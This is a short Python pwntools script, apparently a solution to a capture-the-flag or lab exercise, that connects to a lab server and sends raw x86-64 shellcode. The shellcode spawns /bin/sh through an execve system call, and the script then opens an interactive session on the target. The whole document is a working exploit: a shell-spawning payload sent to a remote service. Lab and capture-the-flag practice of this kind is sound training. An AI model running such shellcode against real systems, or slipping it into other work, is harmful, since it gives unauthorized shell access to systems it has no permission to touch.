from pwn import *

# r = process('/media/sf_D_DRIVE/ret2text')
r = remote('lab.scist.org', 33303)

print(r.recvuntil('OuO: ').decode())

r.sendline(b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05');

r.interactive()
